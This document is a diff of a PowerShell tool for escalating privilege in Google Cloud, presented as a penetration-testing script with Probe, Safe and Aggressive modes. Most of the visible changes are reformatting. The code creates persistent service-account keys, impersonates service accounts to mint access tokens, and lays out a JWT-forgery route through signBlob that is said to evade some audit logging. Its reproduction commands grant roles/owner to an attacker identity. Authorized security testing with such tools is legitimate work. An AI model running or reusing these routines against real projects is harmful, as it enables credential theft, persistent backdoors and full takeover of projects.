@@ -13,11 +13,11 @@
       3. Documents the full chain with step-by-step reproduction commands.
 
     Modes:
-      -Mode Probe     Test permissions only; never create or modify resources.
-      -Mode Safe      Create SA keys & tokens but do NOT modify IAM, deploy code,
-                      or create infrastructure.  (default)
+      -Mode Probe       Test permissions only; never create or modify resources.
+      -Mode Safe        Create SA keys & tokens but do NOT modify IAM, deploy code,
+                        or create infrastructure.  (default)
       -Mode Aggressive  Full exploitation: deploys functions, creates VMs, modifies
-                      IAM policies.  Use only with explicit written authorization.
+                        IAM policies.  Use only with explicit written authorization.
 
     TOOLS REQUIRED: gcloud, gsutil, bq (Google Cloud SDK, Windows / PowerShell)
 
@@ -37,10 +37,10 @@
 #>
 
 param(
-    [Parameter(Mandatory=$true)]
+    [Parameter(Mandatory = $true)]
     [string]$EnumDir,
 
-    [ValidateSet("Probe","Safe","Aggressive")]
+    [ValidateSet("Probe", "Safe", "Aggressive")]
     [string]$Mode = "Safe",
 
     [string]$TargetProjects = ""
@@ -49,27 +49,24 @@ param(
 # ============================================================================
 # CONFIGURATION
 # ============================================================================
-$ErrorActionPreference  = "Continue"
-$Timestamp              = Get-Date -Format "yyyyMMdd_HHmmss"
-$OutputDir              = ".\GCP_PrivEsc_Results_$Timestamp"
-$ChainReportFile        = "$OutputDir\00_CHAIN_REPORT.txt"
-$ProofFile              = "$OutputDir\00_PROOF_LOG.txt"
-$TestLogFile            = "$OutputDir\00_TEST_LOG.txt"
-$CrossProjectFile       = "$OutputDir\00_CROSS_PROJECT_CHAINS.txt"
-$ChainJsonFile          = "$OutputDir\00_CHAINS.json"
-$ErrorLogFile           = "$OutputDir\00_ERRORS.log"
-$CreatedArtifactsFile   = "$OutputDir\00_CREATED_ARTIFACTS.txt"
+$ErrorActionPreference = "Continue"
+$Timestamp             = Get-Date -Format "yyyyMMdd_HHmmss"
+$OutputDir             = ".\GCP_PrivEsc_Results_$Timestamp"
+$ChainReportFile       = "$OutputDir\00_CHAIN_REPORT.txt"
+$ProofFile             = "$OutputDir\00_PROOF_LOG.txt"
+$TestLogFile           = "$OutputDir\00_TEST_LOG.txt"
+$CrossProjectFile      = "$OutputDir\00_CROSS_PROJECT_CHAINS.txt"
+$ChainJsonFile         = "$OutputDir\00_CHAINS.json"
+$ErrorLogFile          = "$OutputDir\00_ERRORS.log"
+$CreatedArtifactsFile  = "$OutputDir\00_CREATED_ARTIFACTS.txt"
 
-# Artifacts the script creates (for cleanup)
-$Script:CreatedArtifacts = [System.Collections.ArrayList]::new()
-# All confirmed chains
-$Script:Chains           = [System.Collections.ArrayList]::new()
-# Permission cache: project -> hashtable of permission -> bool
-$Script:PermCache        = @{}
-# SA role cache: sa_email -> list of roles on the project
-$Script:SARoleCache      = @{}
-# Role permissions loaded from enumerator manifest
+# Script-scoped state
+$Script:CreatedArtifacts  = [System.Collections.ArrayList]::new()
+$Script:Chains            = [System.Collections.ArrayList]::new()
+$Script:PermCache         = @{}
+$Script:SARoleCache       = @{}
 $Script:ManifestRolePerms = @{}
+
 # PrivEsc permission list (must match enumerator)
 $Script:PrivEscPermissions = @(
     "iam.serviceAccounts.actAs",
@@ -111,26 +108,33 @@ $Script:PrivEscPermissions = @(
 # HELPER FUNCTIONS
 # ============================================================================
 
-function Ensure-Dir { param([string]$P); if (-not (Test-Path $P)) { New-Item -ItemType Directory -Path $P -Force | Out-Null } }
+function Ensure-Dir {
+    param([string]$P)
+    if (-not (Test-Path $P)) {
+        New-Item -ItemType Directory -Path $P -Force | Out-Null
+    }
+}
 
 function Write-Log {
     param([string]$Msg, [string]$Lvl = "INFO")
     $ts = Get-Date -Format 'HH:mm:ss'
     $line = "[$ts] [$Lvl] $Msg"
     $color = switch ($Lvl) {
-        "INFO"    { "Cyan" }
-        "TEST"    { "White" }
-        "OK"      { "Green" }
-        "FAIL"    { "DarkGray" }
-        "CHAIN"   { "Magenta" }
-        "WARN"    { "Yellow" }
-        "ERROR"   { "Red" }
-        "PROOF"   { "Green" }
-        default   { "White" }
+        "INFO"  { "Cyan" }
+        "TEST"  { "White" }
+        "OK"    { "Green" }
+        "FAIL"  { "DarkGray" }
+        "CHAIN" { "Magenta" }
+        "WARN"  { "Yellow" }
+        "ERROR" { "Red" }
+        "PROOF" { "Green" }
+        default { "White" }
     }
     Write-Host $line -ForegroundColor $color
     Add-Content -Path $TestLogFile -Value $line
-    if ($Lvl -eq "ERROR") { Add-Content -Path $ErrorLogFile -Value $line }
+    if ($Lvl -eq "ERROR") {
+        Add-Content -Path $ErrorLogFile -Value $line
+    }
 }
 
 function Write-Proof {
@@ -143,13 +147,13 @@ function Record-Chain {
         [string]$ChainID,
         [string]$Project,
         [string]$Title,
-        [string]$Severity,          # CRITICAL / HIGH / MEDIUM
-        [string]$InitialAccess,     # What we start with
-        [string]$TargetPrivilege,   # What we escalate to
-        [string[]]$Steps,           # Ordered exploitation steps
-        [string[]]$Commands,        # Exact gcloud commands to reproduce
+        [string]$Severity,
+        [string]$InitialAccess,
+        [string]$TargetPrivilege,
+        [string[]]$Steps,
+        [string[]]$Commands,
         [string]$Impact,
-        [string]$Proof = ""         # Proof of exploitation output
+        [string]$Proof = ""
     )
 
     $chain = @{
@@ -167,7 +171,24 @@ function Record-Chain {
     }
     [void]$Script:Chains.Add($chain)
 
-    # Pretty-print to chain report
+    # Build steps text
+    $stepsLines = @()
+    for ($i = 0; $i -lt $Steps.Count; $i++) {
+        $stepNum = $i + 1
+        $stepsLines += "  Step $stepNum : $($Steps[$i])"
+    }
+    $stepsText = $stepsLines -join "`n"
+
+    # Build commands text
+    $cmdsLines = @()
+    foreach ($c in $Commands) {
+        $cmdsLines += "  PS> $c"
+    }
+    $cmdsText = $cmdsLines -join "`n"
+
+    # Build proof text
+    $proofText = if ($Proof) { $Proof } else { "(see proof log for output)" }
+
     $report = @"
 
 ################################################################################
@@ -184,12 +205,13 @@ $InitialAccess
 $TargetPrivilege
 
 --- EXPLOITATION STEPS ---
-$( ($Steps | ForEach-Object { $i = [array]::IndexOf($Steps,$_)+1; "  Step $i : $_" }) -join "`n" )
+$stepsText
 
 --- REPRODUCTION COMMANDS ---
-$( $Commands | ForEach-Object { "  PS> $_" } | Out-String )
+$cmdsText
+
 --- PROOF ---
-$( if ($Proof) { $Proof } else { "(see proof log for output)" } )
+$proofText
 ################################################################################
 
 "@
@@ -208,9 +230,12 @@ function Run-GcloudRaw {
     param([string]$Cmd)
     try {
         $raw = Invoke-Expression "gcloud $Cmd 2>&1"
-        $stderr = ($raw | Where-Object { $_ -is [System.Management.Automation.ErrorRecord] }) -join "`n"
-        $stdout = ($raw | Where-Object { $_ -isnot [System.Management.Automation.ErrorRecord] }) -join "`n"
-        return @{ stdout = $stdout; stderr = $stderr; success = (-not ($stderr -match "ERROR|PERMISSION_DENIED|403|FORBIDDEN|ACCESS_DENIED|NOT_FOUND|INVALID_ARGUMENT")) }
+        $errParts = @($raw | Where-Object { $_ -is [System.Management.Automation.ErrorRecord] })
+        $outParts = @($raw | Where-Object { $_ -isnot [System.Management.Automation.ErrorRecord] })
+        $stderr = $errParts -join "`n"
+        $stdout = $outParts -join "`n"
+        $isErr = $stderr -match "ERROR|PERMISSION_DENIED|403|FORBIDDEN|ACCESS_DENIED|NOT_FOUND|INVALID_ARGUMENT"
+        return @{ stdout = $stdout; stderr = $stderr; success = (-not $isErr) }
     }
     catch {
         return @{ stdout = ""; stderr = "$_"; success = $false }
@@ -221,7 +246,8 @@ function Run-GcloudJson {
     param([string]$Cmd)
     $r = Run-GcloudRaw "$Cmd --format=json"
     if ($r.success -and $r.stdout) {
-        try { return $r.stdout | ConvertFrom-Json } catch { return $null }
+        try { return ($r.stdout | ConvertFrom-Json) }
+        catch { return $null }
     }
     return $null
 }
@@ -236,98 +262,83 @@ function Save-Output {
         $json = $Data | ConvertTo-Json -Depth 20
         if ($Append) {
             Add-Content -Path $FilePath -Value $json
-        } else {
+        }
+        else {
             Set-Content -Path $FilePath -Value $json
         }
     }
     catch {
+        $txt = $Data | Out-String
         if ($Append) {
-            Add-Content -Path $FilePath -Value ($Data | Out-String)
-        } else {
-            Set-Content -Path $FilePath -Value ($Data | Out-String)
+            Add-Content -Path $FilePath -Value $txt
+        }
+        else {
+            Set-Content -Path $FilePath -Value $txt
         }
     }
 }
 
-# ---------- Permission testing ----------
+# ============================================================================
+# PERMISSION & ROLE HELPERS
+# ============================================================================
 
 function Test-PermissionBatch {
-    <#
-    .DESCRIPTION
-        Probes a list of permissions on a project using targeted low-impact
-        read commands.  Returns a hashtable of permission -> $true/$false.
-    #>
     param([string]$Project)
-
     Write-Log "  Probing permissions on $Project ..." "TEST"
-
     $results = @{}
 
-    # --- IAM read probes ---
     $r = Run-GcloudRaw "projects get-iam-policy $Project --format=json"
     $results["resourcemanager.projects.getIamPolicy"] = $r.success
 
-    # --- Service accounts ---
     $r = Run-GcloudRaw "iam service-accounts list --project=$Project --format=json"
     $results["iam.serviceAccounts.list"] = $r.success
 
-    # --- Compute ---
     $r = Run-GcloudRaw "compute instances list --project=$Project --format=json --limit=1"
     $results["compute.instances.list"] = $r.success
 
     $r = Run-GcloudRaw "compute project-info describe --project=$Project --format=json"
     $results["compute.projects.get"] = $r.success
 
-    # --- Storage ---
     try {
         $gsOut = gsutil ls -p $Project 2>&1
-        $gsErr = ($gsOut | Where-Object { $_ -is [System.Management.Automation.ErrorRecord] }) -join ""
+        $gsErr = @($gsOut | Where-Object { $_ -is [System.Management.Automation.ErrorRecord] }) -join ""
         $results["storage.buckets.list"] = (-not ($gsErr -match "AccessDeniedException|403"))
-    } catch { $results["storage.buckets.list"] = $false }
+    }
+    catch { $results["storage.buckets.list"] = $false }
 
-    # --- Secrets ---
     $r = Run-GcloudRaw "secrets list --project=$Project --format=json --limit=1"
     $results["secretmanager.secrets.list"] = $r.success
 
-    # --- Cloud Functions ---
     $r = Run-GcloudRaw "functions list --project=$Project --format=json --limit=1"
     $results["cloudfunctions.functions.list"] = $r.success
 
-    # --- Cloud Run ---
     $r = Run-GcloudRaw "run services list --project=$Project --platform=managed --format=json --limit=1"
     $results["run.services.list"] = $r.success
 
-    # --- Cloud Build ---
     $r = Run-GcloudRaw "builds list --project=$Project --format=json --limit=1"
     $results["cloudbuild.builds.list"] = $r.success
 
-    # --- BigQuery ---
     try {
         $bqOut = bq ls --project_id=$Project --format=json 2>&1
-        $bqErr = ($bqOut | Where-Object { $_ -is [System.Management.Automation.ErrorRecord] }) -join ""
+        $bqErr = @($bqOut | Where-Object { $_ -is [System.Management.Automation.ErrorRecord] }) -join ""
         $results["bigquery.datasets.list"] = (-not ($bqErr -match "Access Denied|403|BigQuery API has not been enabled"))
-    } catch { $results["bigquery.datasets.list"] = $false }
+    }
+    catch { $results["bigquery.datasets.list"] = $false }
 
-    # --- Container ---
     $r = Run-GcloudRaw "container clusters list --project=$Project --format=json --limit=1"
     $results["container.clusters.list"] = $r.success
 
-    # --- KMS ---
     $r = Run-GcloudRaw "kms keyrings list --location=global --project=$Project --format=json --limit=1"
     $results["cloudkms.keyRings.list"] = $r.success
 
-    # --- Cloud SQL ---
     $r = Run-GcloudRaw "sql instances list --project=$Project --format=json --limit=1"
     $results["cloudsql.instances.list"] = $r.success
 
-    # --- Logging ---
     $r = Run-GcloudRaw "logging sinks list --project=$Project --format=json --limit=1"
     $results["logging.sinks.list"] = $r.success
 
-    # Cache all
     if (-not $Script:PermCache.ContainsKey($Project)) { $Script:PermCache[$Project] = @{} }
     foreach ($k in $results.Keys) { $Script:PermCache[$Project][$k] = $results[$k] }
-
     return $results
 }
 
@@ -353,48 +364,39 @@ function Get-SARolesOnProject {
 }
 
 function Get-RolePrivEscPerms {
-    <#
-    .DESCRIPTION
-        Returns the privesc-relevant permissions for a role by looking up
-        the role_permissions section of the manifest (populated by the enumerator).
-        Falls back to a live gcloud describe if the manifest lacks the role.
-    #>
     param([string]$Role)
-    # Try manifest first
-    if ($Script:ManifestRolePerms -and $Script:ManifestRolePerms.ContainsKey($Role)) {
+    if ($Script:ManifestRolePerms.Count -gt 0 -and $Script:ManifestRolePerms.ContainsKey($Role)) {
         $entry = $Script:ManifestRolePerms[$Role]
         if ($entry.privesc_permissions) {
             return @($entry.privesc_permissions)
         }
         return @()
     }
-    # Fallback: live query
     try {
         $detail = Run-GcloudJson "iam roles describe $Role"
         if ($detail -and $detail.includedPermissions) {
-            return @($detail.includedPermissions | Where-Object { $_ -in $Script:PrivEscPermissions })
+            $matched = @($detail.includedPermissions | Where-Object { $_ -in $Script:PrivEscPermissions })
+            return $matched
         }
-    } catch {}
+    }
+    catch { }
     return @()
 }
 
 function Format-RolesWithPerms {
-    <#
-    .DESCRIPTION
-        Given a list of role names, returns a formatted string showing each role
-        and its privesc permissions.  Used in chain reports.
-    #>
     param([string[]]$Roles)
     $parts = @()
     foreach ($r in $Roles) {
         $perms = Get-RolePrivEscPerms -Role $r
         if ($perms.Count -gt 0) {
-            $parts += "$r [privesc: $($perms -join ', ')]"
-        } else {
+            $permList = $perms -join ', '
+            $parts += "$r [privesc: $permList]"
+        }
+        else {
             $parts += $r
         }
     }
-    return $parts -join "; "
+    return ($parts -join "; ")
 }
 
 function Test-SAKeyCreateFromBindings {
@@ -419,6 +421,7 @@ function Test-SAKeyCreateFromBindings {
     }
     return $false
 }
+
 
 # ============================================================================
 # ============================================================================
@@ -450,7 +453,8 @@ function Test-SAKeyCreation {
         }
 
         # Safe / Aggressive: actually attempt key creation
-        $keyFile = "$dir\sa_key_$($saEmail -replace '[^a-zA-Z0-9]','_').json"
+        $safeEmail = $saEmail -replace '[^a-zA-Z0-9]', '_'
+        $keyFile = "$dir\sa_key_$safeEmail.json"
         $r = Run-GcloudRaw "iam service-accounts keys create `"$keyFile`" --iam-account=$saEmail --project=$Project"
 
         if ($r.success -and (Test-Path $keyFile)) {
@@ -460,33 +464,47 @@ function Test-SAKeyCreation {
             Record-Artifact -Type "SA_KEY" -Project $Project -Detail "Created key for $saEmail at $keyFile"
 
             $saRoles = Get-SARolesOnProject -SAEmail $saEmail -Project $Project
-            $rolesStr = if ($saRoles) { Format-RolesWithPerms -Roles $saRoles } else { "(unknown - enumerate with activated key)" }
+            if ($saRoles -and $saRoles.Count -gt 0) {
+                $rolesStr = Format-RolesWithPerms -Roles $saRoles
+            }
+            else {
+                $rolesStr = "(unknown - enumerate with activated key)"
+            }
 
             $isDefault = $saEmail -match "\d+-compute@developer|@appspot\.gserviceaccount|@cloudbuild\.gserviceaccount"
-            $severity = if ($isDefault -or $saRoles -match "owner|editor|admin") { "CRITICAL" } else { "HIGH" }
+            $isPriv = $saRoles -match "owner|editor|admin"
+            $severity = if ($isDefault -or $isPriv) { "CRITICAL" } else { "HIGH" }
+
+            $defaultNote = ""
+            if ($isDefault) {
+                $defaultNote = "This is a DEFAULT service account which typically has Editor role, granting near-full project control."
+            }
+
+            $steps = @(
+                "Current identity can create keys for service account $saEmail",
+                "A JSON key file was created, granting persistent authentication as this SA",
+                "The SA has the following roles on the project: $rolesStr",
+                "This key never expires unless explicitly deleted and grants full SA privileges"
+            )
+            $commands = @(
+                "gcloud iam service-accounts keys create key.json --iam-account=$saEmail --project=$Project",
+                "gcloud auth activate-service-account --key-file=key.json",
+                "gcloud projects get-iam-policy $Project --flatten=`"bindings[].members`" --filter=`"bindings.members:serviceAccount:$saEmail`" --format=`"table(bindings.role)`""
+            )
 
             Record-Chain -ChainID $chainID -Project $Project `
                 -Title "SA Key Created: $saEmail" `
                 -Severity $severity `
                 -InitialAccess "Current identity has iam.serviceAccountKeys.create permission on $saEmail" `
                 -TargetPrivilege "Persistent credential as $saEmail (roles: $rolesStr)" `
-                -Steps @(
-                    "Current identity can create keys for service account $saEmail",
-                    "A JSON key file was created, granting persistent authentication as this SA",
-                    "The SA has the following roles on the project: $rolesStr",
-                    "This key never expires unless explicitly deleted and grants full SA privileges"
-                ) `
-                -Commands @(
-                    "gcloud iam service-accounts keys create key.json --iam-account=$saEmail --project=$Project",
-                    "gcloud auth activate-service-account --key-file=key.json",
-                    "gcloud projects get-iam-policy $Project --flatten=`"bindings[].members`" --filter=`"bindings.members:serviceAccount:$saEmail`" --format=`"table(bindings.role)`""
-                ) `
-                -Impact "Persistent credential theft. Attacker can authenticate as $saEmail indefinitely. $(if($isDefault){'This is a DEFAULT service account which typically has Editor role, granting near-full project control.'})" `
+                -Steps $steps `
+                -Commands $commands `
+                -Impact "Persistent credential theft. Attacker can authenticate as $saEmail indefinitely. $defaultNote" `
                 -Proof "Key file created at: $keyFile"
 
             Write-Proof "[$chainID] SA Key created for $saEmail`nStored at: $keyFile`nRoles: $rolesStr`n"
-
-        } else {
+        }
+        else {
             Write-Log "    DENIED: Cannot create key for $saEmail" "FAIL"
         }
     }
@@ -508,52 +526,70 @@ function Test-SAImpersonation {
 
         if ($Mode -eq "Probe") { continue }
 
-        # --- Test 1: getAccessToken (impersonate for OAuth token) ---
+        # --- Test 1: getAccessToken ---
         $r = Run-GcloudRaw "auth print-access-token --impersonate-service-account=$saEmail"
         if ($r.success -and $r.stdout -match "^ya29\.") {
             $chainNum++
             $chainID = "IMPERSONATE-$Project-$chainNum"
-            $token = $r.stdout.Substring(0, [math]::Min(20, $r.stdout.Length)) + "...[REDACTED]"
+            $tokenLen = [math]::Min(20, $r.stdout.Length)
+            $token = $r.stdout.Substring(0, $tokenLen) + "...[REDACTED]"
 
             $saRoles = Get-SARolesOnProject -SAEmail $saEmail -Project $Project
-            $rolesStr = if ($saRoles) { Format-RolesWithPerms -Roles $saRoles } else { "(enumerate with token)" }
+            if ($saRoles -and $saRoles.Count -gt 0) {
+                $rolesStr = Format-RolesWithPerms -Roles $saRoles
+            }
+            else {
+                $rolesStr = "(enumerate with token)"
+            }
+
             $isDefault = $saEmail -match "\d+-compute@developer|@appspot\.gserviceaccount|@cloudbuild\.gserviceaccount"
-            $severity = if ($isDefault -or $saRoles -match "owner|editor|admin") { "CRITICAL" } else { "HIGH" }
+            $isPriv = $saRoles -match "owner|editor|admin"
+            $severity = if ($isDefault -or $isPriv) { "CRITICAL" } else { "HIGH" }
+
+            $defaultNote = ""
+            if ($isDefault) {
+                $defaultNote = "DEFAULT SA - likely has Editor role on the entire project."
+            }
+
+            $steps = @(
+                "Current identity can generate access tokens for $saEmail",
+                "Token generated successfully (short-lived, ~1 hour, but renewable)",
+                "All API calls made with this token execute as $saEmail",
+                "SA roles on this project: $rolesStr"
+            )
+            $commands = @(
+                "# Generate access token",
+                "gcloud auth print-access-token --impersonate-service-account=$saEmail",
+                "",
+                "# Use impersonation in any gcloud command",
+                "gcloud compute instances list --project=$Project --impersonate-service-account=$saEmail",
+                "gcloud projects get-iam-policy $Project --impersonate-service-account=$saEmail",
+                "",
+                "# Chain: if this SA can impersonate ANOTHER SA (delegation)",
+                "gcloud auth print-access-token --impersonate-service-account=HIGHER_PRIV_SA --delegates=$saEmail"
+            )
 
             Record-Chain -ChainID $chainID -Project $Project `
                 -Title "SA Impersonation via getAccessToken: $saEmail" `
                 -Severity $severity `
                 -InitialAccess "Current identity has iam.serviceAccounts.getAccessToken on $saEmail (via roles/iam.serviceAccountTokenCreator or equivalent)" `
                 -TargetPrivilege "Short-lived OAuth2 token as $saEmail (roles: $rolesStr)" `
-                -Steps @(
-                    "Current identity can generate access tokens for $saEmail",
-                    "Token generated successfully (short-lived, ~1 hour, but renewable)",
-                    "All API calls made with this token execute as $saEmail",
-                    "SA roles on this project: $rolesStr"
-                ) `
-                -Commands @(
-                    "# Generate access token",
-                    "gcloud auth print-access-token --impersonate-service-account=$saEmail",
-                    "",
-                    "# Use impersonation in any gcloud command",
-                    "gcloud compute instances list --project=$Project --impersonate-service-account=$saEmail",
-                    "gcloud projects get-iam-policy $Project --impersonate-service-account=$saEmail",
-                    "",
-                    "# Chain: if this SA can impersonate ANOTHER SA (delegation)",
-                    "gcloud auth print-access-token --impersonate-service-account=HIGHER_PRIV_SA --delegates=$saEmail"
-                ) `
-                -Impact "Identity impersonation. Attacker operates as $saEmail for any GCP API. $(if($isDefault){'DEFAULT SA — likely has Editor role on the entire project.'})" `
+                -Steps $steps `
+                -Commands $commands `
+                -Impact "Identity impersonation. Attacker operates as $saEmail for any GCP API. $defaultNote" `
                 -Proof "Token prefix: $token"
 
             Write-Proof "[$chainID] Access token obtained for $saEmail`nToken prefix: $token`nRoles: $rolesStr`n"
-            Save-Output "$dir\token_$($saEmail -replace '[^a-zA-Z0-9]','_').txt" "Token obtained. Prefix: $token"
-
-        } else {
+            $safeEmail = $saEmail -replace '[^a-zA-Z0-9]', '_'
+            Save-Output "$dir\token_$safeEmail.txt" "Token obtained. Prefix: $token"
+        }
+        else {
             Write-Log "    DENIED: getAccessToken for $saEmail" "FAIL"
         }
 
-        # --- Test 2: signBlob (can forge tokens if this works) ---
-        $signFile = "$dir\signblob_test_$($saEmail -replace '[^a-zA-Z0-9]','_').txt"
+        # --- Test 2: signBlob ---
+        $safeEmail = $saEmail -replace '[^a-zA-Z0-9]', '_'
+        $signFile = "$dir\signblob_test_$safeEmail.txt"
         $tempIn = "$dir\_signblob_input.tmp"
         Set-Content -Path $tempIn -Value "pentest-probe" -NoNewline
         $r = Run-GcloudRaw "iam service-accounts sign-blob $tempIn $signFile --iam-account=$saEmail"
@@ -563,36 +599,39 @@ function Test-SAImpersonation {
             $chainNum++
             $chainID = "SIGNBLOB-$Project-$chainNum"
 
+            $steps = @(
+                "Current identity can sign blobs as $saEmail",
+                "This allows crafting a self-signed JWT and exchanging it for an access token",
+                "The forged token grants full $saEmail privileges",
+                "This is equivalent to getAccessToken but bypasses some audit logging"
+            )
+            $commands = @(
+                "# Sign a blob as the SA",
+                "echo 'payload' > input.txt",
+                "gcloud iam service-accounts sign-blob input.txt signed.txt --iam-account=$saEmail",
+                "",
+                "# To forge an access token:",
+                "# 1. Construct a JWT with header={alg:RS256,typ:JWT}",
+                "#    payload={iss:$saEmail, scope:'https://www.googleapis.com/auth/cloud-platform',",
+                "#             aud:'https://oauth2.googleapis.com/token', iat:<now>, exp:<now+3600>}",
+                "# 2. Sign the JWT using sign-blob",
+                "# 3. POST to https://oauth2.googleapis.com/token with grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer"
+            )
+
             Record-Chain -ChainID $chainID -Project $Project `
                 -Title "SA signBlob Capability: $saEmail" `
                 -Severity "HIGH" `
                 -InitialAccess "Current identity has iam.serviceAccounts.signBlob on $saEmail" `
-                -TargetPrivilege "Can sign arbitrary payloads as $saEmail — enables forging access tokens and OpenID Connect tokens" `
-                -Steps @(
-                    "Current identity can sign blobs as $saEmail",
-                    "This allows crafting a self-signed JWT and exchanging it for an access token",
-                    "The forged token grants full $saEmail privileges",
-                    "This is equivalent to getAccessToken but bypasses some audit logging"
-                ) `
-                -Commands @(
-                    "# Sign a blob as the SA",
-                    "echo 'payload' > input.txt",
-                    "gcloud iam service-accounts sign-blob input.txt signed.txt --iam-account=$saEmail",
-                    "",
-                    "# To forge an access token:",
-                    "# 1. Construct a JWT with header={alg:RS256,typ:JWT}",
-                    "#    payload={iss:$saEmail, scope:'https://www.googleapis.com/auth/cloud-platform',",
-                    "#             aud:'https://oauth2.googleapis.com/token', iat:<now>, exp:<now+3600>}",
-                    "# 2. Sign the JWT using sign-blob",
-                    "# 3. POST to https://oauth2.googleapis.com/token with grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer"
-                ) `
+                -TargetPrivilege "Can sign arbitrary payloads as $saEmail - enables forging access tokens and OpenID Connect tokens" `
+                -Steps $steps `
+                -Commands $commands `
                 -Impact "Token forgery. Attacker can create access tokens as $saEmail without direct impersonation, potentially evading detection." `
                 -Proof "Signed blob output at: $signFile"
 
             Write-Proof "[$chainID] signBlob succeeded for $saEmail`nOutput: $signFile`n"
             Record-Artifact -Type "SIGN_BLOB" -Project $Project -Detail "Signed blob for $saEmail"
-
-        } else {
+        }
+        else {
             Write-Log "    DENIED: signBlob for $saEmail" "FAIL"
             Remove-Item $signFile -ErrorAction SilentlyContinue
         }
@@ -608,15 +647,14 @@ function Test-IAMPolicyModification {
 
     Write-Log "  [IAM-SETPOLICY] Testing setIamPolicy on $Project ..." "TEST"
 
-    # Step 1: Can we read the policy? (needed to modify it)
     $policy = Run-GcloudJson "projects get-iam-policy $Project"
     if (-not $policy) {
-        Write-Log "    Cannot read IAM policy — setIamPolicy test skipped" "FAIL"
+        Write-Log "    Cannot read IAM policy - setIamPolicy test skipped" "FAIL"
         return
     }
     Save-Output "$dir\current_policy.json" $policy
 
-    # Step 2: Check if our identity has roles that include setIamPolicy
+    # Check if our identity has roles that include setIamPolicy
     $callerAccount = $Script:Manifest.caller_account
     $setIamRoles = @("roles/owner", "roles/resourcemanager.projectIamAdmin", "roles/iam.securityAdmin")
     $hasPotentialSetIam = $false
@@ -625,7 +663,9 @@ function Test-IAMPolicyModification {
     foreach ($binding in $policy.bindings) {
         if ($binding.role -in $setIamRoles) {
             foreach ($member in $binding.members) {
-                if ($member -match [regex]::Escape($callerAccount) -or $member -in @("allUsers","allAuthenticatedUsers")) {
+                $isCallerMatch = $member -match [regex]::Escape($callerAccount)
+                $isPublic = ($member -eq "allUsers" -or $member -eq "allAuthenticatedUsers")
+                if ($isCallerMatch -or $isPublic) {
                     $hasPotentialSetIam = $true
                     $matchedRole = $binding.role
                     break
@@ -635,12 +675,13 @@ function Test-IAMPolicyModification {
         if ($hasPotentialSetIam) { break }
     }
 
+    # Also check custom roles
     if (-not $hasPotentialSetIam) {
-        # Also check custom roles
         $projData = $Script:Manifest.projects[$Project]
         if ($projData -and $projData.custom_roles) {
             foreach ($cr in $projData.custom_roles) {
-                $crFile = "$EnumDir\$Project\iam\custom_role_$($cr.title -replace '[^a-zA-Z0-9]','_').json"
+                $safeCrTitle = $cr.title -replace '[^a-zA-Z0-9]', '_'
+                $crFile = "$EnumDir\$Project\iam\custom_role_$safeCrTitle.json"
                 if (Test-Path $crFile) {
                     $crData = Get-Content $crFile -Raw | ConvertFrom-Json
                     if ($crData.includedPermissions -contains "resourcemanager.projects.setIamPolicy") {
@@ -657,6 +698,7 @@ function Test-IAMPolicyModification {
                         }
                     }
                 }
+                if ($hasPotentialSetIam) { break }
             }
         }
     }
@@ -664,76 +706,83 @@ function Test-IAMPolicyModification {
     if ($hasPotentialSetIam) {
         Write-Log "    POTENTIAL setIamPolicy via role: $matchedRole" "OK"
         $matchedRolePerms = Get-RolePrivEscPerms -Role $matchedRole
-        $matchedRolePermStr = if ($matchedRolePerms.Count -gt 0) { "Role privesc permissions: $($matchedRolePerms -join ', ')" } else { "" }
+        $matchedRolePermStr = ""
+        if ($matchedRolePerms.Count -gt 0) {
+            $matchedRolePermStr = "Role privesc permissions: " + ($matchedRolePerms -join ', ')
+        }
 
         if ($Mode -eq "Aggressive") {
             Write-Log "    [AGGRESSIVE] Testing actual setIamPolicy write..." "WARN"
-
             $tempPolicyFile = "$dir\test_policy_write.json"
             $policy | ConvertTo-Json -Depth 20 | Set-Content $tempPolicyFile
-
-            # Try setting the UNMODIFIED policy (same etag) — proves write access without changing anything
             $r = Run-GcloudRaw "projects set-iam-policy $Project `"$tempPolicyFile`" --format=json"
 
             if ($r.success) {
                 $chainID = "SETIAMPOLICY-$Project"
+                $steps = @(
+                    "Current identity is bound to $matchedRole on project $Project",
+                    "This role includes resourcemanager.projects.setIamPolicy",
+                    $matchedRolePermStr,
+                    "setIamPolicy write was tested and CONFIRMED by re-applying the current policy",
+                    "An attacker could add roles/owner for their own account or any service account",
+                    "This is a FULL PROJECT COMPROMISE - any role can be granted to any identity"
+                )
+                $commands = @(
+                    "# Read current policy",
+                    "gcloud projects get-iam-policy $Project --format=json > policy.json",
+                    "",
+                    "# Add owner role for attacker (EXAMPLE - this would be the attack)",
+                    "# Edit policy.json to add: {role: 'roles/owner', members: ['user:attacker@evil.com']}",
+                    "",
+                    "# Apply modified policy",
+                    "gcloud projects set-iam-policy $Project policy.json",
+                    "",
+                    "# Or use add-iam-policy-binding shortcut:",
+                    "gcloud projects add-iam-policy-binding $Project --member='user:attacker@evil.com' --role='roles/owner'"
+                )
                 Record-Chain -ChainID $chainID -Project $Project `
                     -Title "Project IAM Policy Write Access CONFIRMED" `
                     -Severity "CRITICAL" `
                     -InitialAccess "Current identity has $matchedRole which includes resourcemanager.projects.setIamPolicy. $matchedRolePermStr" `
-                    -TargetPrivilege "Can grant ANY role to ANY identity on project $Project — full project takeover" `
-                    -Steps @(
-                        "Current identity is bound to $matchedRole on project $Project",
-                        "This role includes resourcemanager.projects.setIamPolicy",
-                        "$(if ($matchedRolePermStr) { $matchedRolePermStr })",
-                        "setIamPolicy write was tested and CONFIRMED by re-applying the current policy",
-                        "An attacker could add roles/owner for their own account or any service account",
-                        "This is a FULL PROJECT COMPROMISE — any role can be granted to any identity"
-                    ) `
-                    -Commands @(
-                        "# Read current policy",
-                        "gcloud projects get-iam-policy $Project --format=json > policy.json",
-                        "",
-                        "# Add owner role for attacker (EXAMPLE — this would be the attack)",
-                        "# Edit policy.json to add: {role: 'roles/owner', members: ['user:attacker@evil.com']}",
-                        "",
-                        "# Apply modified policy",
-                        "gcloud projects set-iam-policy $Project policy.json",
-                        "",
-                        "# Or use add-iam-policy-binding shortcut:",
-                        "gcloud projects add-iam-policy-binding $Project --member='user:attacker@evil.com' --role='roles/owner'"
-                    ) `
+                    -TargetPrivilege "Can grant ANY role to ANY identity on project $Project - full project takeover" `
+                    -Steps $steps `
+                    -Commands $commands `
                     -Impact "FULL PROJECT TAKEOVER. Attacker can grant themselves Owner, read all secrets, control all resources, create persistent backdoors via SA keys, and pivot to any connected project." `
                     -Proof "setIamPolicy write succeeded (unmodified policy re-applied)"
 
